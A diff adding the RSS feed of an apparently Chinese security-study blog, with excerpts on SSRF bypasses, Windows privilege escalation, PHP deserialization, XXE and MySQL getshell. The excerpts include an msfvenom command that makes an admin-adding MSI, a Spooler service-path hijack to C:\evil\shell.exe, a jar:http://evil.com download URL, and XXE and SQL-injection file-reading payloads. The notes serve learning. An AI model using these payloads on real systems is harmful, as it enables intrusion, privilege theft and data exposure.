+&lt;p&gt;&lt;code&gt;file://&lt;/code&gt; 协议	与 PHP 类似&lt;/p&gt;
+&lt;p&gt;可以读取本地文件：&lt;code&gt;file:///etc/passwd&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;netdoc://&lt;/code&gt; 协议	它允许你访问并提取 &lt;code&gt;jar&lt;/code&gt; 包中的内容。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Payload: &lt;code&gt;netdoc:///etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;jar://&lt;/code&gt; 协议	它允许你访问并提取 &lt;code&gt;jar&lt;/code&gt; 包中的内容。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;语法： &lt;code&gt;jar:{url}!/{entry}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;用法： &lt;code&gt;jar:http://evil.com/test.jar!/com/test/Main.class&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;利用点：
+&lt;ol&gt;
+&lt;li&gt;让服务器去下载远程恶意 jar 包。&lt;/li&gt;
+&lt;li&gt;读取本地 classpath 下的配置文件。&lt;/li&gt;
+&lt;li&gt;结合某些反序列化漏洞，控制类加载过程。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;绕过&#34;&gt;绕过&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;IP地址&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;进制转换： 浏览器和许多网络库支持非十进制的 IP。
+
+八进制： 0177.0.0.1
+十六进制： 0x7f.0x0.0x0.0x1
+十进制整数（最隐蔽）： 将 IP 换算成一个超大数字。127.0.0.1 ----&amp;gt; 2130706433
+
+特殊省略写法：
+
+127.0.0.1 可以写成 127.1 或 127.0.1。
+0.0.0.0 在 Linux 下通常也会指向本地。
+
+IPv6 绕过：
+使用 [::1] 代表 127.0.0.1。
+使用 IPv6 格式的内网地址。
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;利用DNS&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Windows提权</title>
+      <link>http://localhost:1313/nodes/windows%E6%8F%90%E6%9D%83/</link>
+      <pubDate>Sun, 15 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/windows%E6%8F%90%E6%9D%83/</guid>
+      <description>&lt;h1 id=&#34;windows工作组环境和域环境提权方式详解&#34;&gt;Windows工作组环境和域环境提权方式详解&lt;/h1&gt;
+&lt;h2 id=&#34;一工作组环境提权方式&#34;&gt;一、工作组环境提权方式&lt;/h2&gt;
+&lt;h3 id=&#34;1-alwaysinstallelevated提权&#34;&gt;1. AlwaysInstallElevated提权&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;系统已启用AlwaysInstallElevated（注册表值为1）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;检查方法&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用步骤&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;生成恶意MSI文件（在Kali Linux中）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd -f msi -o add.msi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;如果在Windows上操作，可以使用在线工具生成MSI文件&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在Windows上执行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;msiexec /i add.msi
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;验证提权：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net user hacker
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;成功标志&lt;/strong&gt;：看到hacker账户，且在管理员组中&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;2-服务权限配置错误提权&#34;&gt;2. 服务权限配置错误提权&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;服务路径权限配置错误&lt;/li&gt;
+&lt;li&gt;当前用户对服务可执行文件或目录有写权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;检查方法&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc query
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;winpeas.exe quiet notcolor serviceinfo
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用步骤&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;找到一个服务（如Spooler）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc qc Spooler
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改服务路径：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&amp;#34;&lt;/span&gt; /t REG_EXPAND_SZ /v ImagePath /d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil\shell.exe&amp;#34;&lt;/span&gt; /f
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;重启服务：&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>PHP反序列化</title>
+      <link>http://localhost:1313/nodes/php_serialize/</link>
+      <pubDate>Sat, 07 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/php_serialize/</guid>
+      <description>&lt;p&gt;距离第一次学习php反序列已经很长时间了，初次学习时就学的迷迷糊糊，有很多理解不到位的地方，正好最近有时间打算回过头重新开始学习一遍，理解不到位之处请各位大佬多多指正。&lt;/p&gt;
+&lt;h3 id=&#34;为什么需要序列化和反序列化&#34;&gt;为什么需要序列化和反序列化？&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;网络传输只能处理位流(Bytes)&lt;/strong&gt; , 当你在java,php,python中定义一个复杂的用户对象，但是路由器并不认识，只能通过序列化成字符串的方式以字节流的方式传输，传输流程大致如下：&lt;/p&gt;
+&lt;p&gt;服务器对象&amp;ndash;&amp;gt; 序列化&amp;ndash;&amp;gt; 字节流&amp;ndash;&amp;gt; 网络传输&amp;ndash;&amp;gt; 反序列化&amp;ndash;&amp;gt; 客户端&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;内存(RAM)易失&lt;/strong&gt;，程序运行在内存中，一旦断电，关闭数据就会消失&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;php中的序列化反序列化函数&#34;&gt;php中的序列化反序列化函数&lt;/h3&gt;
+&lt;p&gt;序列化：&lt;code&gt;serialize()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;反序列化：&lt;code&gt;unserialize()&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用&#34;&gt;漏洞利用&lt;/h3&gt;
+&lt;p&gt;前提:  服务端(不论是当前代码还是所包含的代码中)必须要有对象(序列化形式)所对应的类, 否则无法反序列化&lt;/p&gt;
+&lt;p&gt;例如: &lt;code&gt;payload:O:1:&amp;quot;**S**&amp;quot;:1:{s:4:&amp;quot;test&amp;quot;;s:29:&amp;quot;&amp;lt;script&amp;gt;alert(&#39;xss&#39;)&amp;lt;/script&amp;gt;&amp;quot;;} &lt;/code&gt;这时候如果服务端没有一个叫做S的类, 就会反序列化失败&lt;/p&gt;
+&lt;p&gt;所以说, 想要发起反序列化攻击, 必要条件之一: 必须知道服务端有哪些类&lt;/p&gt;
+&lt;h3 id=&#34;魔术方法&#34;&gt;魔术方法&lt;/h3&gt;
+&lt;p&gt;注:加黑重点关注&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;&lt;strong&gt;魔术方法&lt;/strong&gt;&lt;/th&gt;
+          &lt;th&gt;&lt;strong&gt;描述&lt;/strong&gt;&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__construct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;strong&gt;构造方法&lt;/strong&gt;，当对象被实例化（&lt;code&gt;new&lt;/code&gt;）时自动调用。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__destruct()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;strong&gt;析构方法&lt;/strong&gt;，当对象被销毁时自动调用。反序列化攻击中最常见的入口。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;在对象上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__callStatic()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;在静态上下文中调用一个&lt;strong&gt;不可访问或不存在的方法&lt;/strong&gt;时触发。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__get()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;读取对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。常用的跳板。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;写入对象中&lt;strong&gt;不可访问（未定义或私有）的属性&lt;/strong&gt;时触发。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__isset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;使用 &lt;code&gt;isset()&lt;/code&gt; 或 &lt;code&gt;empty()&lt;/code&gt; 检查对象中不可访问的属性时触发。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unset()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;使用 &lt;code&gt;unset()&lt;/code&gt; 删除对象中不可访问的属性时触发。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__sleep()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当对象被 &lt;code&gt;serialize()&lt;/code&gt; 序列化前触发，通常用于返回需要被序列化的属性列表。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__wakeup()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当对象被 &lt;code&gt;unserialize()&lt;/code&gt; 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当对象被转换成&lt;strong&gt;字符串&lt;/strong&gt;（如 &lt;code&gt;echo&lt;/code&gt; 或拼接）时自动调用。核心跳板。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__invoke()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当尝试以&lt;strong&gt;函数方式调用对象&lt;/strong&gt;（如 &lt;code&gt;$obj()&lt;/code&gt;）时触发。常用的跳板。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__clone()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当对象使用 &lt;code&gt;clone&lt;/code&gt; 关键字被克隆时调用。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__serialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;PHP 7.4+ 引入。序列化前触发，优先级高于 &lt;code&gt;__sleep&lt;/code&gt;。返回一个包含对象数据的数组。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__unserialize()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;PHP 7.4+ 引入。反序列化后触发，优先级高于 &lt;code&gt;__wakeup&lt;/code&gt;。用于恢复对象状态。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__set_state()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当使用 &lt;code&gt;var_export()&lt;/code&gt; 导出类时触发。必须是静态方法，返回类实例。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;strong&gt;&lt;code&gt;__debugInfo()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+          &lt;td&gt;当使用 &lt;code&gt;var_dump()&lt;/code&gt; 打印对象信息时触发，用于控制显示的属性。&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;1、 &lt;code&gt;__construct()&lt;/code&gt; 和 &lt;code&gt;__destruct()&lt;/code&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>XML 漏洞详解</title>
+      <link>http://localhost:1313/nodes/xml/</link>
+      <pubDate>Wed, 04 Feb 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/xml/</guid>
+      <description>&lt;h1 id=&#34;xml漏洞&#34;&gt;XML漏洞&lt;/h1&gt;
+&lt;h2 id=&#34;理论&#34;&gt;理论：&lt;/h2&gt;
+&lt;p&gt;xml是一种用来传输和存储数据的格式，长得有些像HTML&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;user&amp;gt;
+	&amp;lt;username&amp;gt;admin&amp;lt;/username&amp;gt;
+	&amp;lt;role&amp;gt;manager&amp;lt;/role&amp;gt;
+&amp;lt;/user&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要学习XML就要先学习DTD&lt;/p&gt;
+&lt;p&gt;什么是DTD？&lt;/p&gt;
+&lt;p&gt;DTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是&lt;strong&gt;Entity&lt;/strong&gt;，而他也就是漏洞的根源&lt;/p&gt;
+&lt;p&gt;他有些像编程语言中的变量，举两个例子&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;内部实体   
+&amp;lt;!DOCTYPE root [
+	&amp;lt;!ENTITY name &amp;#34;h4xk0r&amp;#34;&amp;gt;
+]&amp;gt;
+&amp;lt;root&amp;gt;Hello &amp;amp;name;&amp;lt;/root&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据
+语法关键字 SYSTEM 或 PUBLIC
+
+&amp;lt;!DOCTYPE root[
+	&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;
+]&amp;gt;
+&amp;lt;root&amp;gt;&amp;amp;xxe;&amp;lt;root&amp;gt;
+
+如果在实际过程中后端接收了你的XML，并且解析了&amp;amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;实战向&#34;&gt;实战向：&lt;/h2&gt;
+&lt;h3 id=&#34;怎么去寻找漏洞点&#34;&gt;怎么去寻找漏洞点：&lt;/h3&gt;
+&lt;p&gt;显式的XML接口：&lt;/p&gt;
+&lt;p&gt;如果请求头是 &lt;code&gt;Content-Type: application/xml&lt;/code&gt; 或 &lt;code&gt;text/xml&lt;/code&gt;，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了&lt;/p&gt;
+&lt;p&gt;隐式接口（content-Type欺骗）：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;假设一个api接口是这样的：
+POST /api/login HTTP/1.1
+Content-Type: application/json
+
+{&amp;#34;user&amp;#34;: &amp;#34;admin&amp;#34;, &amp;#34;pass&amp;#34;: &amp;#34;123&amp;#34;}
+
+很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload
+
+POST /api/login HTTP/1.1
+Content-Type: application/xml  &amp;lt;-- 修改这里
+
+&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;
+&amp;lt;user&amp;gt;admin&amp;lt;/user&amp;gt;
+&amp;lt;pass&amp;gt;123&amp;lt;/pass&amp;gt;
+
+如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;文件上传（SVG与office）&amp;ndash;这个是比较容易被忽视的点&lt;/p&gt;
+&lt;p&gt;svg： 是一种图片格式的矢量图。微信头像，网站logo上传处&lt;/p&gt;
+&lt;p&gt;Execl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>MySQL getshell</title>
+      <link>http://localhost:1313/nodes/mysql-getshell/</link>
+      <pubDate>Fri, 30 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/mysql-getshell/</guid>
+      <description>&lt;h2 id=&#34;udf--os-shell&#34;&gt;UDF  (&amp;ndash;os-shell)&lt;/h2&gt;
+&lt;h3 id=&#34;利用条件&#34;&gt;利用条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;数据库为DBA,可以使用sqlmap的&lt;code&gt;--is-dba&lt;/code&gt;查看当前网站连接的数据库账户是否是管理员&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;没有具体值&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
+1. --sql-shell 
+1. 进入数据库后: SHOW VARS LIKE &amp;#39;secure_file_priv&amp;#39;;
+2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 
+	返回正常则null,无法写入
+	页面异常则,则不是null
+	判断是否为空:
+	?id=1 AND length(@@secure_file_priv) = 0	页面正常则为空
+3. 尝试写入文件: ?id=1 INTO OUTFILE &amp;#39;/var/www/html/test.txt&amp;#39; -- 根据报错信息判断
+4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=&amp;#39;FILE&amp;#39; AND grantee=CONCAT(&amp;#34;&amp;#39;&amp;#34;, (SELECT CURRENT_USER()), &amp;#34;&amp;#39;&amp;#34;)) IS NOT NULL	即使secure_file_priv为空,用户没有FILE权限,也无法写入
+或者
+AND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;知道网站的绝对路径&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;查找:
+1. 注入报错信息
+2. 利用内部函数和元数据:
+Apache (Ubuntu):  UNION SELECT 1, load_file(&amp;#39;/etc/apache2/sites-enabled/000-default.conf&amp;#39;), 3
+Nginx:               UNION SELECT 1, load_file(&amp;#39;/etc/nginx/nginx.conf&amp;#39;), 3
+Windows (IIS):       C:\Windows\System32\inetsrv\config\applicationHost.config
+3.常见的默认路径:
+Linux (Apache)	/var/www/html/, /var/www/www.example.com/
+Linux (Nginx)	/usr/share/nginx/html/, /var/www/html/
+Windows (IIS)	C:\inetpub\wwwroot\
+Windows (XAMPP)	C:\xampp\htdocs\
+Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
+&lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title></title>
+      <link>http://localhost:1313/nodes/c/c-%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/nodes/c/c-%E8%AF%AD%E8%A8%80-%E5%AD%A6%E4%B9%A0/</guid>
+      <description>&lt;h1 id=&#34;c-语言-学习&#34;&gt;C 语言 学习&lt;/h1&gt;
+&lt;p&gt;学习c语言是为了后面学习免杀,记录一下学习过程方便温习&lt;/p&gt;
+&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;
+&lt;h4 id=&#34;程序执行的两种方式&#34;&gt;程序执行的两种方式:&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;解释: 借助一个程序,读懂你写的程序去执行&lt;/li&gt;
+&lt;li&gt;编译: 借助一个程序,把你的程序翻译成计算机懂得语言&amp;ndash;机器语言&amp;ndash;写的程序,然后执行(整体转换为机器码后，由系统直接调度执行)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;整数类型&#34;&gt;整数类型&lt;/h3&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;类型&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;存储大小&lt;/th&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;值范围&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;char&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-128 到 127 或 0 到 255&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned char&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 255&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;signed char&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-128 到 127&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;int&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned int&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535 或 0 到 4,294,967,295&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;short&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned short&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;long&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;-2,147,483,648 到 2,147,483,647&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;unsigned long&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;0 到 4,294,967,295&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;一个demo:&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
